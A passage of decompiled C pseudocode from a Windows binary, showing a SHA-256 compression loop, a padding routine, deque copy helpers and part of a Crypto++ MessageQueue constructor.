    v54 = (__ROR4__(v53, 5) ^ v53 ^ __ROR4__(v184.m128i_i32[3], 25))
        + v177
        + v195
        + *((_DWORD *)v3 + 13)
        + (v174 ^ v184.m128i_i32[3] & (v174 ^ v170));
    v55 = __ROR4__(v171.m128i_i32[3], 2);
    v184.m128i_i32[2] = v190 + v54;
    v171.m128i_i32[2] = (__ROR4__(v55, 11) ^ v55 ^ __ROR4__(v171.m128i_i32[3], 22))
                      + v54
                      + (v183 ^ (v183 ^ v171.m128i_i32[3]) & (v187 ^ v183));
    v56 = __ROR4__(v184.m128i_i32[2], 6);
    v57 = (__ROR4__(v56, 5) ^ v56 ^ __ROR4__(v184.m128i_i32[2], 25))
        + v174
        + HIDWORD(v194)
        + *((_DWORD *)v3 + 14)
        + (v170 ^ v184.m128i_i32[2] & (v170 ^ v184.m128i_i32[3]));
    v58 = __ROR4__(v171.m128i_i32[2], 2);
    v184.m128i_i32[1] = v187 + v57;
    v171.m128i_i32[1] = (__ROR4__(v58, 11) ^ v58 ^ __ROR4__(v171.m128i_i32[2], 22))
                      + v57
                      + (v171.m128i_i32[3] ^ (v171.m128i_i32[3] ^ v171.m128i_i32[2]) & (v183 ^ v171.m128i_i32[3]));
    v59 = __ROR4__(v184.m128i_i32[1], 6);
    v60 = (__ROR4__(v59, 5) ^ v59 ^ __ROR4__(v184.m128i_i32[1], 25))
        + v170
        + v194
        + *((_DWORD *)v3 + 15)
        + (v184.m128i_i32[3] ^ v184.m128i_i32[1] & (v184.m128i_i32[3] ^ v184.m128i_i32[2]));
    LODWORD(result) = v171.m128i_i32[2] ^ v171.m128i_i32[1];
    v62 = __ROR4__(v171.m128i_i32[1], 2);
    v63 = v60 + (v171.m128i_i32[2] ^ (v171.m128i_i32[2] ^ v171.m128i_i32[1]) & (v171.m128i_i32[3] ^ v171.m128i_i32[2]));
    v64 = v183 + v60;
    v184.m128i_i32[0] = v64;
    v65 = (__ROR4__(v62, 11) ^ v62 ^ __ROR4__(v171.m128i_i32[1], 22)) + v63;
    v171.m128i_i32[0] = v65;
    do
    {
      v3 += 8;
      v66 = v184.m128i_i32[2] ^ v64 & (v184.m128i_i32[2] ^ v184.m128i_i32[1]);
      v67 = v64;
      v68 = __ROR4__(v64, 6);
      v69 = (__ROR4__(v68, 5) ^ v68 ^ __ROR4__(v67, 25)) + v66;
      v70 = __ROR4__(HIDWORD(v194), 17);
      v71 = __ROR4__(v201, 7);
      HIDWORD(v201) += v197
                     + (v70 ^ (HIDWORD(v194) >> 10) ^ __ROR4__(v70, 2))
                     + (__ROR4__(v71, 11) ^ v71 ^ ((unsigned int)v201 >> 3));
      v72 = HIDWORD(v201) + v184.m128i_i32[3] + *(_DWORD *)v3 + v69;
      v73 = v65;
      v74 = v171.m128i_i32[1] ^ v65;
      v75 = v73;
      v76 = __ROR4__(v73, 2);
      v171.m128i_i32[3] += v72;
      v184.m128i_i32[3] = (__ROR4__(v76, 11) ^ v76 ^ __ROR4__(v75, 22)) + v72 + (v171.m128i_i32[1] ^ v74 & result);
      v77 = __ROR4__(v171.m128i_i32[3], 6);
      v78 = (__ROR4__(v77, 5) ^ v77 ^ __ROR4__(v171.m128i_i32[3], 25))
          + (v184.m128i_i32[1] ^ v171.m128i_i32[3] & (v184.m128i_i32[1] ^ v184.m128i_i32[0]));
      v79 = __ROR4__(v194, 17);
      v80 = __ROR4__(HIDWORD(v200), 7);
      LODWORD(v201) = v201
                    + HIDWORD(v196)
                    + (v79 ^ ((unsigned int)v194 >> 10) ^ __ROR4__(v79, 2))
                    + (__ROR4__(v80, 11) ^ v80 ^ (HIDWORD(v200) >> 3));
      v81 = v201 + v184.m128i_i32[2] + *((_DWORD *)v3 + 1) + v78;
      v82 = __ROR4__(v184.m128i_i32[3], 2);
      v171.m128i_i32[2] += v81;
      v184.m128i_i32[2] = (__ROR4__(v82, 11) ^ v82 ^ __ROR4__(v184.m128i_i32[3], 22))
                        + v81
                        + (v171.m128i_i32[0] ^ (v171.m128i_i32[0] ^ v184.m128i_i32[3]) & v74);
      v83 = __ROR4__(v171.m128i_i32[2], 6);
      v84 = (__ROR4__(v83, 5) ^ v83 ^ __ROR4__(v171.m128i_i32[2], 25))
          + (v184.m128i_i32[0] ^ v171.m128i_i32[2] & (v184.m128i_i32[0] ^ v171.m128i_i32[3]));
      v85 = __ROR4__(HIDWORD(v201), 17);
      v86 = __ROR4__(v200, 7);
      HIDWORD(v200) += v196
                     + (v85 ^ (HIDWORD(v201) >> 10) ^ __ROR4__(v85, 2))
                     + (__ROR4__(v86, 11) ^ v86 ^ ((unsigned int)v200 >> 3));
      v87 = HIDWORD(v200) + v184.m128i_i32[1] + *((_DWORD *)v3 + 2) + v84;
      v88 = __ROR4__(v184.m128i_i32[2], 2);
      v171.m128i_i32[1] += v87;
      v184.m128i_i32[1] = (__ROR4__(v88, 11) ^ v88 ^ __ROR4__(v184.m128i_i32[2], 22))
                        + v87
                        + (v184.m128i_i32[3] ^ (v184.m128i_i32[3] ^ v184.m128i_i32[2]) & (v171.m128i_i32[0] ^ v184.m128i_i32[3]));
      v89 = __ROR4__(v171.m128i_i32[1], 6);
      v90 = (__ROR4__(v89, 5) ^ v89 ^ __ROR4__(v171.m128i_i32[1], 25))
          + (v171.m128i_i32[3] ^ v171.m128i_i32[1] & (v171.m128i_i32[3] ^ v171.m128i_i32[2]));
      v91 = __ROR4__(v201, 17);
      v92 = __ROR4__(HIDWORD(v199), 7);
      LODWORD(v200) = v200
                    + HIDWORD(v195)
                    + (v91 ^ ((unsigned int)v201 >> 10) ^ __ROR4__(v91, 2))
                    + (__ROR4__(v92, 11) ^ v92 ^ (HIDWORD(v199) >> 3));
      v93 = v200 + v184.m128i_i32[0] + *((_DWORD *)v3 + 3) + v90;
      v94 = __ROR4__(v184.m128i_i32[1], 2);
      v171.m128i_i32[0] += v93;
      v184.m128i_i32[0] = (__ROR4__(v94, 11) ^ v94 ^ __ROR4__(v184.m128i_i32[1], 22))
                        + v93
                        + (v184.m128i_i32[2] ^ (v184.m128i_i32[2] ^ v184.m128i_i32[1]) & (v184.m128i_i32[3] ^ v184.m128i_i32[2]));
      v95 = __ROR4__(v171.m128i_i32[0], 6);
      v96 = (__ROR4__(v95, 5) ^ v95 ^ __ROR4__(v171.m128i_i32[0], 25))
          + (v171.m128i_i32[2] ^ v171.m128i_i32[0] & (v171.m128i_i32[2] ^ v171.m128i_i32[1]));
      v97 = __ROR4__(HIDWORD(v200), 17);
      v98 = __ROR4__(v199, 7);
      HIDWORD(v199) += v195
                     + (v97 ^ (HIDWORD(v200) >> 10) ^ __ROR4__(v97, 2))
                     + (__ROR4__(v98, 11) ^ v98 ^ ((unsigned int)v199 >> 3));
      v99 = HIDWORD(v199) + v171.m128i_i32[3] + *((_DWORD *)v3 + 4) + v96;
      v100 = __ROR4__(v184.m128i_i32[0], 2);
      v184.m128i_i32[3] += v99;
      v171.m128i_i32[3] = (__ROR4__(v100, 11) ^ v100 ^ __ROR4__(v184.m128i_i32[0], 22))
                        + v99
                        + (v184.m128i_i32[1] ^ (v184.m128i_i32[1] ^ v184.m128i_i32[0]) & (v184.m128i_i32[2] ^ v184.m128i_i32[1]));
      v101 = __ROR4__(v184.m128i_i32[3], 6);
      v102 = (__ROR4__(v101, 5) ^ v101 ^ __ROR4__(v184.m128i_i32[3], 25))
           + (v171.m128i_i32[1] ^ v184.m128i_i32[3] & (v171.m128i_i32[1] ^ v171.m128i_i32[0]));
      v103 = __ROR4__(v200, 17);
      v104 = __ROR4__(HIDWORD(v198), 7);
      LODWORD(v199) = v199
                    + HIDWORD(v194)
                    + (v103 ^ ((unsigned int)v200 >> 10) ^ __ROR4__(v103, 2))
                    + (__ROR4__(v104, 11) ^ v104 ^ (HIDWORD(v198) >> 3));
      v105 = v199 + v171.m128i_i32[2] + *((_DWORD *)v3 + 5) + v102;
      v106 = __ROR4__(v171.m128i_i32[3], 2);
      v184.m128i_i32[2] += v105;
      v171.m128i_i32[2] = (__ROR4__(v106, 11) ^ v106 ^ __ROR4__(v171.m128i_i32[3], 22))
                        + v105
                        + (v184.m128i_i32[0] ^ (v184.m128i_i32[0] ^ v171.m128i_i32[3]) & (v184.m128i_i32[1] ^ v184.m128i_i32[0]));
      v107 = __ROR4__(v184.m128i_i32[2], 6);
      v108 = (__ROR4__(v107, 5) ^ v107 ^ __ROR4__(v184.m128i_i32[2], 25))
           + (v171.m128i_i32[0] ^ v184.m128i_i32[2] & (v171.m128i_i32[0] ^ v184.m128i_i32[3]));
      v109 = __ROR4__(HIDWORD(v199), 17);
      v110 = __ROR4__(v198, 7);
      HIDWORD(v198) += v194
                     + (v109 ^ (HIDWORD(v199) >> 10) ^ __ROR4__(v109, 2))
                     + (__ROR4__(v110, 11) ^ v110 ^ ((unsigned int)v198 >> 3));
      v111 = HIDWORD(v198) + v171.m128i_i32[1] + *((_DWORD *)v3 + 6) + v108;
      v112 = __ROR4__(v171.m128i_i32[2], 2);
      v184.m128i_i32[1] += v111;
      v171.m128i_i32[1] = (__ROR4__(v112, 11) ^ v112 ^ __ROR4__(v171.m128i_i32[2], 22))
                        + v111
                        + (v171.m128i_i32[3] ^ (v171.m128i_i32[3] ^ v171.m128i_i32[2]) & (v184.m128i_i32[0] ^ v171.m128i_i32[3]));
      v113 = __ROR4__(v184.m128i_i32[1], 6);
      v114 = (__ROR4__(v113, 5) ^ v113 ^ __ROR4__(v184.m128i_i32[1], 25))
           + (v184.m128i_i32[3] ^ v184.m128i_i32[1] & (v184.m128i_i32[3] ^ v184.m128i_i32[2]));
      v115 = __ROR4__(v199, 17);
      v116 = __ROR4__(HIDWORD(v197), 7);
      LODWORD(v198) = v198
                    + HIDWORD(v201)
                    + (v115 ^ ((unsigned int)v199 >> 10) ^ __ROR4__(v115, 2))
                    + (__ROR4__(v116, 11) ^ v116 ^ (HIDWORD(v197) >> 3));
      v117 = v198 + v171.m128i_i32[0] + *((_DWORD *)v3 + 7) + v114;
      v118 = __ROR4__(v171.m128i_i32[1], 2);
      v184.m128i_i32[0] += v117;
      v171.m128i_i32[0] = (__ROR4__(v118, 11) ^ v118 ^ __ROR4__(v171.m128i_i32[1], 22))
                        + v117
                        + (v171.m128i_i32[2] ^ (v171.m128i_i32[2] ^ v171.m128i_i32[1]) & (v171.m128i_i32[3] ^ v171.m128i_i32[2]));
      v119 = __ROR4__(v184.m128i_i32[0], 6);
      v120 = (__ROR4__(v119, 5) ^ v119 ^ __ROR4__(v184.m128i_i32[0], 25))
           + (v184.m128i_i32[2] ^ v184.m128i_i32[0] & (v184.m128i_i32[2] ^ v184.m128i_i32[1]));
      v121 = __ROR4__(HIDWORD(v198), 17);
      v122 = __ROR4__(v197, 7);
      HIDWORD(v197) += v201
                     + (v121 ^ (HIDWORD(v198) >> 10) ^ __ROR4__(v121, 2))
                     + (__ROR4__(v122, 11) ^ v122 ^ ((unsigned int)v197 >> 3));
      v123 = HIDWORD(v197) + v184.m128i_i32[3] + *((_DWORD *)v3 + 8) + v120;
      v124 = __ROR4__(v171.m128i_i32[0], 2);
      v171.m128i_i32[3] += v123;
      v184.m128i_i32[3] = (__ROR4__(v124, 11) ^ v124 ^ __ROR4__(v171.m128i_i32[0], 22))
                        + v123
                        + (v171.m128i_i32[1] ^ (v171.m128i_i32[1] ^ v171.m128i_i32[0]) & (v171.m128i_i32[2] ^ v171.m128i_i32[1]));
      v125 = __ROR4__(v171.m128i_i32[3], 6);
      v126 = (__ROR4__(v125, 5) ^ v125 ^ __ROR4__(v171.m128i_i32[3], 25))
           + (v184.m128i_i32[1] ^ v171.m128i_i32[3] & (v184.m128i_i32[1] ^ v184.m128i_i32[0]));
      v127 = __ROR4__(v198, 17);
      v128 = __ROR4__(HIDWORD(v196), 7);
      LODWORD(v197) = v197
                    + HIDWORD(v200)
                    + (v127 ^ ((unsigned int)v198 >> 10) ^ __ROR4__(v127, 2))
                    + (__ROR4__(v128, 11) ^ v128 ^ (HIDWORD(v196) >> 3));
      v129 = v197 + v184.m128i_i32[2] + *((_DWORD *)v3 + 9) + v126;
      v130 = __ROR4__(v184.m128i_i32[3], 2);
      v171.m128i_i32[2] += v129;
      v184.m128i_i32[2] = (__ROR4__(v130, 11) ^ v130 ^ __ROR4__(v184.m128i_i32[3], 22))
                        + v129
                        + (v171.m128i_i32[0] ^ (v171.m128i_i32[0] ^ v184.m128i_i32[3]) & (v171.m128i_i32[1] ^ v171.m128i_i32[0]));
      v131 = __ROR4__(v171.m128i_i32[2], 6);
      v132 = (__ROR4__(v131, 5) ^ v131 ^ __ROR4__(v171.m128i_i32[2], 25))
           + (v184.m128i_i32[0] ^ v171.m128i_i32[2] & (v184.m128i_i32[0] ^ v171.m128i_i32[3]));
      v133 = __ROR4__(HIDWORD(v197), 17);
      v134 = __ROR4__(v196, 7);
      HIDWORD(v196) += v200
                     + (v133 ^ (HIDWORD(v197) >> 10) ^ __ROR4__(v133, 2))
                     + (__ROR4__(v134, 11) ^ v134 ^ ((unsigned int)v196 >> 3));
      v135 = HIDWORD(v196) + v184.m128i_i32[1] + *((_DWORD *)v3 + 10) + v132;
      v136 = __ROR4__(v184.m128i_i32[2], 2);
      v171.m128i_i32[1] += v135;
      v184.m128i_i32[1] = (__ROR4__(v136, 11) ^ v136 ^ __ROR4__(v184.m128i_i32[2], 22))
                        + v135
                        + (v184.m128i_i32[3] ^ (v184.m128i_i32[3] ^ v184.m128i_i32[2]) & (v171.m128i_i32[0] ^ v184.m128i_i32[3]));
      v137 = __ROR4__(v171.m128i_i32[1], 6);
      v138 = (__ROR4__(v137, 5) ^ v137 ^ __ROR4__(v171.m128i_i32[1], 25))
           + (v171.m128i_i32[3] ^ v171.m128i_i32[1] & (v171.m128i_i32[3] ^ v171.m128i_i32[2]));
      v139 = __ROR4__(v197, 17);
      v140 = __ROR4__(HIDWORD(v195), 7);
      LODWORD(v196) = v196
                    + HIDWORD(v199)
                    + (v139 ^ ((unsigned int)v197 >> 10) ^ __ROR4__(v139, 2))
                    + (__ROR4__(v140, 11) ^ v140 ^ (HIDWORD(v195) >> 3));
      v141 = v196 + v184.m128i_i32[0] + *((_DWORD *)v3 + 11) + v138;
      v142 = __ROR4__(v184.m128i_i32[1], 2);
      v171.m128i_i32[0] += v141;
      v184.m128i_i32[0] = (__ROR4__(v142, 11) ^ v142 ^ __ROR4__(v184.m128i_i32[1], 22))
                        + v141
                        + (v184.m128i_i32[2] ^ (v184.m128i_i32[2] ^ v184.m128i_i32[1]) & (v184.m128i_i32[3] ^ v184.m128i_i32[2]));
      v143 = __ROR4__(v171.m128i_i32[0], 6);
      v144 = (__ROR4__(v143, 5) ^ v143 ^ __ROR4__(v171.m128i_i32[0], 25))
           + (v171.m128i_i32[2] ^ v171.m128i_i32[0] & (v171.m128i_i32[2] ^ v171.m128i_i32[1]));
      v145 = __ROR4__(HIDWORD(v196), 17);
      v146 = __ROR4__(v195, 7);
      HIDWORD(v195) += v199
                     + (v145 ^ (HIDWORD(v196) >> 10) ^ __ROR4__(v145, 2))
                     + (__ROR4__(v146, 11) ^ v146 ^ ((unsigned int)v195 >> 3));
      v147 = HIDWORD(v195) + v171.m128i_i32[3] + *((_DWORD *)v3 + 12) + v144;
      v148 = __ROR4__(v184.m128i_i32[0], 2);
      v184.m128i_i32[3] += v147;
      v171.m128i_i32[3] = (__ROR4__(v148, 11) ^ v148 ^ __ROR4__(v184.m128i_i32[0], 22))
                        + v147
                        + (v184.m128i_i32[1] ^ (v184.m128i_i32[1] ^ v184.m128i_i32[0]) & (v184.m128i_i32[2] ^ v184.m128i_i32[1]));
      v149 = __ROR4__(v184.m128i_i32[3], 6);
      v150 = (__ROR4__(v149, 5) ^ v149 ^ __ROR4__(v184.m128i_i32[3], 25))
           + (v171.m128i_i32[1] ^ v184.m128i_i32[3] & (v171.m128i_i32[1] ^ v171.m128i_i32[0]));
      v151 = __ROR4__(v196, 17);
      v152 = __ROR4__(HIDWORD(v194), 7);
      LODWORD(v195) = v195
                    + HIDWORD(v198)
                    + (v151 ^ ((unsigned int)v196 >> 10) ^ __ROR4__(v151, 2))
                    + (__ROR4__(v152, 11) ^ v152 ^ (HIDWORD(v194) >> 3));
      v153 = v195 + v171.m128i_i32[2] + *((_DWORD *)v3 + 13) + v150;
      v154 = __ROR4__(v171.m128i_i32[3], 2);
      v184.m128i_i32[2] += v153;
      v171.m128i_i32[2] = (__ROR4__(v154, 11) ^ v154 ^ __ROR4__(v171.m128i_i32[3], 22))
                        + v153
                        + (v184.m128i_i32[0] ^ (v184.m128i_i32[0] ^ v171.m128i_i32[3]) & (v184.m128i_i32[1] ^ v184.m128i_i32[0]));
      v155 = __ROR4__(v184.m128i_i32[2], 6);
      v156 = (__ROR4__(v155, 5) ^ v155 ^ __ROR4__(v184.m128i_i32[2], 25))
           + (v171.m128i_i32[0] ^ v184.m128i_i32[2] & (v171.m128i_i32[0] ^ v184.m128i_i32[3]));
      v157 = __ROR4__(HIDWORD(v195), 17);
      v158 = __ROR4__(v194, 7);
      HIDWORD(v194) += v198
                     + (v157 ^ (HIDWORD(v195) >> 10) ^ __ROR4__(v157, 2))
                     + (__ROR4__(v158, 11) ^ v158 ^ ((unsigned int)v194 >> 3));
      v159 = HIDWORD(v194) + v171.m128i_i32[1] + *((_DWORD *)v3 + 14) + v156;
      v160 = __ROR4__(v171.m128i_i32[2], 2);
      v184.m128i_i32[1] += v159;
      v171.m128i_i32[1] = (__ROR4__(v160, 11) ^ v160 ^ __ROR4__(v171.m128i_i32[2], 22))
                        + v159
                        + (v171.m128i_i32[3] ^ (v171.m128i_i32[3] ^ v171.m128i_i32[2]) & (v184.m128i_i32[0] ^ v171.m128i_i32[3]));
      v161 = __ROR4__(v184.m128i_i32[1], 6);
      v162 = (__ROR4__(v161, 5) ^ v161 ^ __ROR4__(v184.m128i_i32[1], 25))
           + (v184.m128i_i32[3] ^ v184.m128i_i32[1] & (v184.m128i_i32[3] ^ v184.m128i_i32[2]));
      v163 = __ROR4__(v195, 17);
      v164 = __ROR4__(HIDWORD(v201), 7);
      LODWORD(v194) = v194
                    + HIDWORD(v197)
                    + (v163 ^ ((unsigned int)v195 >> 10) ^ __ROR4__(v163, 2))
                    + (__ROR4__(v164, 11) ^ v164 ^ (HIDWORD(v201) >> 3));
      v165 = v194 + v171.m128i_i32[0] + *((_DWORD *)v3 + 15) + v162;
      result = (unsigned int)(v171.m128i_i32[2] ^ v171.m128i_i32[1]);
      v166 = __ROR4__(v171.m128i_i32[1], 2);
      v167 = v165 + (v171.m128i_i32[2] ^ result & (v171.m128i_i32[3] ^ v171.m128i_i32[2]));
      v64 = v184.m128i_i32[0] + v165;
      v184.m128i_i32[0] = v64;
      v65 = (__ROR4__(v166, 11) ^ v166 ^ __ROR4__(v171.m128i_i32[1], 22)) + v167;
      v171.m128i_i32[0] = v65;
    }
    while ( v3 != qword_13F187770 );
    v5 = _mm_add_epi32(_mm_load_si128(a1 + 1), v184);
    si128 = _mm_add_epi32(_mm_load_si128(a1), v171);
    a1[1] = v5;
    *a1 = si128;
    a2 = v203 + 8;
    v203 = a2;
  }
  while ( a2 != v204 );
  return result;
}
// 13F187770: using guessed type __int64 qword_13F187770[88];

//----- (000000013F13BE70) ----------------------------------------------------
__int64 __fastcall sub_13F13BE70(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        int a7,
        _BYTE *a8,
        unsigned __int64 a9)
{
  _BYTE *v9; // rbx
  _BYTE *v10; // r15
  __m128i *v11; // rdi

  v9 = a8;
  if ( (a9 & 7) != 0 )
  {
    *a8 = 0;
    v9 = a8 + 1;
  }
  *v9 = 1;
  v10 = &v9[(a9 >> 3) - (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)a5 + 64i64))(a5)];
  v11 = (__m128i *)&v10[-*(unsigned int *)(a6 + 8)];
  sub_13F15EF70((__int64)(v9 + 1), 0xFFu, (char *)&v11[-1].m128i_u64[1] + 7 - (v9 + 1));
  v11[-1].m128i_i8[15] = 0;
  sub_13F15EB00(v11, *(const __m128i **)a6, *(unsigned int *)(a6 + 8));
  return (*(__int64 (__fastcall **)(__int64, _BYTE *))(*(_QWORD *)a5 + 48i64))(a5, v10);
}

//----- (000000013F13BF20) ----------------------------------------------------
__int64 __fastcall sub_13F13BF20(__int64 a1, __int64 a2, unsigned int *a3)
{
  _QWORD *v3; // r10
  __int64 v5; // r11
  __int64 result; // rax
  unsigned __int64 v7; // r9
  __int64 v8; // rdx
  unsigned __int64 v9; // r8

  v3 = *(_QWORD **)a1;
  v5 = *(_QWORD *)(a2 + 16);
  result = *(_QWORD *)(a1 + 16);
  if ( *(_QWORD *)a1 )
    v3 = (_QWORD *)*v3;
  if ( result != v5 )
  {
    v7 = *(_QWORD *)(a1 + 16);
    do
    {
      v8 = v7 & 3;
      v9 = v7++ >> 2;
      result = *a3;
      *(_DWORD *)(*(_QWORD *)(v3[1] + 8 * ((v3[2] - 1i64) & v9)) + 4 * v8) = result;
    }
    while ( v7 != v5 );
  }
  return result;
}

//----- (000000013F13BFA0) ----------------------------------------------------
__int64 __fastcall sub_13F13BFA0(__int64 a1, __int64 a2, __int64 *a3)
{
  _QWORD *v3; // r10
  __int64 v5; // r11
  __int64 result; // rax
  unsigned __int64 v7; // r9
  __int64 v8; // rdx
  unsigned __int64 v9; // r8

  v3 = *(_QWORD **)a1;
  v5 = *(_QWORD *)(a2 + 16);
  result = *(_QWORD *)(a1 + 16);
  if ( *(_QWORD *)a1 )
    v3 = (_QWORD *)*v3;
  if ( result != v5 )
  {
    v7 = *(_QWORD *)(a1 + 16);
    do
    {
      v8 = v7 & 1;
      v9 = v7++ >> 1;
      result = *a3;
      *(_QWORD *)(*(_QWORD *)(v3[1] + 8 * ((v3[2] - 1i64) & v9)) + 8 * v8) = *a3;
    }
    while ( v7 != v5 );
  }
  return result;
}

//----- (000000013F13C020) ----------------------------------------------------
_QWORD *__fastcall sub_13F13C020(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD *v4; // rbp
  unsigned __int64 v5; // rdi
  _QWORD *v7; // rax
  __int64 v8; // r15
  _QWORD *v9; // rsi
  unsigned __int64 v10; // rbx
  __int64 v11; // r10
  __int64 v12; // rcx
  unsigned __int64 v13; // r8
  __int64 v14; // rdx
  _QWORD *v15; // rax

  v4 = *(_QWORD **)a2;
  v5 = *(_QWORD *)(a2 + 16);
  if ( *(_QWORD *)a2 )
    v4 = (_QWORD *)*v4;
  v7 = *(_QWORD **)a4;
  v8 = *(_QWORD *)(a3 + 16);
  if ( *(_QWORD *)a4 )
    v9 = (_QWORD *)*v7;
  else
    v9 = 0i64;
  v10 = *(_QWORD *)(a4 + 16);
  if ( v5 != v8 )
  {
    do
    {
      v11 = v5 & 3;
      v12 = (v4[2] - 1i64) & (v5 >> 2);
      v13 = v10 >> 2;
      v14 = v10++ & 3;
      ++v5;
      *(_DWORD *)(*(_QWORD *)(v9[1] + 8 * ((v9[2] - 1i64) & v13)) + 4 * v14) = *(_DWORD *)(*(_QWORD *)(v4[1] + 8 * v12)
                                                                                         + 4 * v11);
    }
    while ( v5 != v8 );
    v7 = *(_QWORD **)a4;
  }
  *(_QWORD *)(a4 + 16) = v10;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = v10;
  if ( v7 )
  {
    v15 = (_QWORD *)*v7;
    if ( v15 )
      *a1 = *v15;
  }
  return a1;
}

//----- (000000013F13C130) ----------------------------------------------------
_QWORD *__fastcall sub_13F13C130(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD *v4; // rbp
  unsigned __int64 v5; // rdi
  _QWORD *v7; // rax
  __int64 v8; // r15
  _QWORD *v9; // rsi
  unsigned __int64 v10; // rbx
  __int64 v11; // r10
  __int64 v12; // rcx
  unsigned __int64 v13; // r8
  __int64 v14; // rdx
  _QWORD *v15; // rax

  v4 = *(_QWORD **)a2;
  v5 = *(_QWORD *)(a2 + 16);
  if ( *(_QWORD *)a2 )
    v4 = (_QWORD *)*v4;
  v7 = *(_QWORD **)a4;
  v8 = *(_QWORD *)(a3 + 16);
  if ( *(_QWORD *)a4 )
    v9 = (_QWORD *)*v7;
  else
    v9 = 0i64;
  v10 = *(_QWORD *)(a4 + 16);
  if ( v5 != v8 )
  {
    do
    {
      v11 = v5 & 1;
      v12 = (v4[2] - 1i64) & (v5 >> 1);
      v13 = v10 >> 1;
      v14 = v10++ & 1;
      ++v5;
      *(_QWORD *)(*(_QWORD *)(v9[1] + 8 * ((v9[2] - 1i64) & v13)) + 8 * v14) = *(_QWORD *)(*(_QWORD *)(v4[1] + 8 * v12)
                                                                                         + 8 * v11);
    }
    while ( v5 != v8 );
    v7 = *(_QWORD **)a4;
  }
  *(_QWORD *)(a4 + 16) = v10;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = v10;
  if ( v7 )
  {
    v15 = (_QWORD *)*v7;
    if ( v15 )
      *a1 = *v15;
  }
  return a1;
}

//----- (000000013F13C240) ----------------------------------------------------
_QWORD *__fastcall sub_13F13C240(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD *v4; // rsi
  __int64 v5; // r15
  _QWORD *v6; // rax
  _QWORD *v7; // rbp
  __int64 v8; // rdi
  __int64 v9; // r13
  unsigned __int64 v10; // r8
  __int64 v11; // r10
  unsigned __int64 v12; // rdx
  _QWORD *v13; // rax

  v4 = *(_QWORD **)a3;
  v5 = *(_QWORD *)(a2 + 16);
  if ( *(_QWORD *)a3 )
    v4 = (_QWORD *)*v4;
  v6 = *(_QWORD **)a4;
  if ( *(_QWORD *)a4 )
    v7 = (_QWORD *)*v6;
  else
    v7 = 0i64;
  v8 = *(_QWORD *)(a4 + 16);
  if ( v5 != *(_QWORD *)(a3 + 16) )
  {
    v9 = *(_QWORD *)(a3 + 16);
    do
    {
      v10 = (unsigned __int64)(v8 - 1) >> 2;
      v11 = ((_BYTE)v9 - 1) & 3;
      --v8;
      v12 = (v4[2] - 1i64) & ((unsigned __int64)--v9 >> 2);
      *(_DWORD *)(*(_QWORD *)(v7[1] + 8 * ((v7[2] - 1i64) & v10)) + 4 * (v8 & 3)) = *(_DWORD *)(*(_QWORD *)(v4[1] + 8 * v12)
                                                                                              + 4 * v11);
    }
    while ( v5 != v9 );
    v6 = *(_QWORD **)a4;
  }
  *(_QWORD *)(a4 + 16) = v8;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = v8;
  if ( v6 )
  {
    v13 = (_QWORD *)*v6;
    if ( v13 )
      *a1 = *v13;
  }
  return a1;
}

//----- (000000013F13C380) ----------------------------------------------------
_QWORD *__fastcall sub_13F13C380(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD *v4; // rsi
  __int64 v5; // r15
  _QWORD *v6; // rax
  _QWORD *v7; // rbp
  __int64 v8; // rdi
  __int64 v9; // r13
  unsigned __int64 v10; // r8
  __int64 v11; // r10
  unsigned __int64 v12; // rdx
  _QWORD *v13; // rax

  v4 = *(_QWORD **)a3;
  v5 = *(_QWORD *)(a2 + 16);
  if ( *(_QWORD *)a3 )
    v4 = (_QWORD *)*v4;
  v6 = *(_QWORD **)a4;
  if ( *(_QWORD *)a4 )
    v7 = (_QWORD *)*v6;
  else
    v7 = 0i64;
  v8 = *(_QWORD *)(a4 + 16);
  if ( v5 != *(_QWORD *)(a3 + 16) )
  {
    v9 = *(_QWORD *)(a3 + 16);
    do
    {
      v10 = (unsigned __int64)(v8 - 1) >> 1;
      v11 = ((_BYTE)v9 - 1) & 1;
      --v8;
      v12 = (v4[2] - 1i64) & ((unsigned __int64)--v9 >> 1);
      *(_QWORD *)(*(_QWORD *)(v7[1] + 8 * ((v7[2] - 1i64) & v10)) + 8 * (v8 & 1)) = *(_QWORD *)(*(_QWORD *)(v4[1] + 8 * v12)
                                                                                              + 8 * v11);
    }
    while ( v5 != v9 );
    v6 = *(_QWORD **)a4;
  }
  *(_QWORD *)(a4 + 16) = v8;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = v8;
  if ( v6 )
  {
    v13 = (_QWORD *)*v6;
    if ( v13 )
      *a1 = *v13;
  }
  return a1;
}

//----- (000000013F13C4C0) ----------------------------------------------------
__int64 __fastcall sub_13F13C4C0(__int64 a1, unsigned int a2)
{
  _OWORD *v4; // rax
  _OWORD *v5; // rax
  int v7; // [rsp+58h] [rbp+10h] BYREF
  __int64 v8; // [rsp+60h] [rbp+18h] BYREF
  __int64 v9; // [rsp+68h] [rbp+20h]

  sub_13F10EE30(a1, 0);
  *(_DWORD *)(a1 + 24) = -1;
  *(_QWORD *)a1 = &CryptoPP::MessageQueue::`vftable';
  *(_QWORD *)(a1 + 8) = off_13F1891F8;
  sub_13F131450(a1 + 32, a2);
  v8 = 0i64;
  v9 = a1 + 112;
  *(_QWORD *)(a1 + 112) = 0i64;
  *(_QWORD *)(a1 + 120) = 0i64;
  *(_QWORD *)(a1 + 128) = 0i64;
  *(_QWORD *)(a1 + 136) = 0i64;
  *(_QWORD *)(a1 + 144) = 0i64;
  v4 = (_OWORD *)sub_13F14059C(16i64);
  *(_QWORD *)(a1 + 112) = v4;
  *v4 = 0i64;
  **(_QWORD **)(a1 + 112) = a1 + 112;
  sub_13F13CF40(a1 + 112, 1i64, &v8);
  v7 = 0;
  v8 = a1 + 152;
  *(_QWORD *)(a1 + 152) = 0i64;
  *(_QWORD *)(a1 + 160) = 0i64;
  *(_QWORD *)(a1 + 168) = 0i64;
  *(_QWORD *)(a1 + 176) = 0i64;
  *(_QWORD *)(a1 + 184) = 0i64;
  v5 = (_OWORD *)sub_13F14059C(16i64);
